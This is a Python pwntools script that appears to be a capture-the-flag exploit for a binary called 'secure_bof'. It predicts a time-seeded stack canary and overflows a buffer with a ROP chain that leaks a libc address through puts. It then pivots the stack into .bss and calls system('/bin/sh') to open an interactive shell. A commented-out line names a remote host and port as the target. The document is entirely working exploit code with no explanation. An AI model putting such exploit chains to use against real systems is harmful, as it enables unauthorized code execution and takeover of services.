#!/usr/bin/env python
from pwn import *
from ctypes import *

context.arch = 'amd64'

host = '60.251.236.18'
#y = remote( host , 10004 )
y = process( '../secure_bof/share/secure_bof' )


libc = ELF( './libc-2.27.so' )

l = CDLL( '/lib/x86_64-linux-gnu/libc.so.6' )
l.srand( l.time(0) + 1 )

canary = ''

for i in range( 0x10 ):
    canary += chr( l.rand() & 0xff )

y.sendafter( '>' , str( 2147483648 ) )

ret = 0x401016
leave_ret = 0x40126d
pop_rbp = 0x4011a9
pop_rdi = 0x40144b
pop_rsi_r15 = 0x401449
main = 0x4012af
read_plt = 0x401080
puts_plt = 0x401060
bss = 0x404020 + 0x700

p = flat(
    pop_rdi,
    0x403ff0, # __libc_start_main got
    puts_plt,
    pop_rdi,
    0,
    pop_rsi_r15,
    bss,
    0,
    read_plt,
    pop_rbp,
    bss - 8,
    leave_ret
)

y.sendafter( '>' , 'a' * 0x100 + canary + p64( 0 ) * 3 + p )

l.srand( l.time(0) )

canary = ''

for i in range( 0x10 ):
    canary += chr( l.rand() & 0xff )


y.recvuntil( ':)\n' )

libc.address = u64( y.recv(6) + '\0\0' ) - libc.sym.__libc_start_main
success( 'libc -> %s' % hex( libc.address ) )


p = flat(
    pop_rdi,
    libc.search( '/bin/sh' ).next(), # __libc_start_main got
    libc.sym.system
)

pause()
y.send( p )


y.interactive()